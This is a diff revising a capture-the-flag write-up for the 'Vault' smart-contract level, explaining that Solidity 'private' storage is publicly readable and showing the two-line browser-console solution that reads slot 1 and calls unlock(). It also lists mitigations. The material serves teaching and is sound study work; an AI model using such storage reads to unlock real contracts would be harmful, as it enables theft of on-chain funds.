@@ -1,35 +1,31 @@
-# Vault
+# Level 08: Vault
 
-## Vulnerability: False Sense of Privacy with `private` Variables
+**Target:** [Vault.sol](./Vault.sol)
 
-**Category:** Information Disclosure
-**Severity:** High
-**Target Contract:** [Vault.sol](./Vault.sol)
+## Vulnerability
 
-## Analysis
-
-The contract stores a `password` as a `private` state variable (`bytes32 private password`) and uses it inside `unlock()` to guard the vault. The developer assumed that marking a variable as `private` hides it from external access.
-
-In Solidity, `private` only prevents **other contracts** from reading the variable via a getter function. It does **not** hide the data from the blockchain itself. Every state variable is stored in a deterministic storage slot, and anyone can read any slot using an RPC call (`eth_getStorageAt`).
+The contract stores a `password` as a `private` state variable and uses it to guard `unlock()`. The developer assumed `private` hides the data.
 
 ```solidity
-bool public locked;      // slot 0
-bytes32 private password; // slot 1 — "private" but fully readable
+bool public locked;       // slot 0
+bytes32 private password; // slot 1 — "private" but fully readable off-chain
 ```
 
-## Exploit Steps
+## Root Cause
 
-1. Read the password directly from storage slot 1:
+`private` only prevents other contracts from reading via a getter. All storage is publicly readable off-chain via `eth_getStorageAt` — the blockchain is a public ledger.
+
+## Exploit
+
+Read slot 1 directly and pass the value to `unlock()`:
+
 ```javascript
-await web3.eth.getStorageAt(contract.address, 1)
-```
-2. Pass the returned `bytes32` value to `unlock()`:
-```javascript
-await contract.unlock("0x...")
+const password = await web3.eth.getStorageAt(contract.address, 1);
+await contract.unlock(password);
 ```
 
-**Solved via browser console — no exploit contract needed.**
+Solved via browser console — no exploit contract needed.
 
-## Key Takeaway
+## Real-World Reference
 
-The blockchain is a **public ledger**. Every piece of data stored on-chain — including `private` variables — is visible to anyone with an RPC endpoint. Never store secrets (passwords, private keys, API keys) in smart contract storage. If sensitive data must be used on-chain, store only its hash (commitment scheme) or use off-chain computation with on-chain verification (e.g., ZK proofs).
+This is the same fundamental issue as Level 12 (Privacy) but simpler. In production, sensitive data should never be stored in contract storage. Common mitigations include commitment schemes (store only the hash, reveal later) or off-chain computation with on-chain verification (ZK proofs). The [Blockchain Graveyard](https://magoo.github.io/Blockchain-Graveyard/) catalogs multiple incidents where "hidden" on-chain data was trivially read.
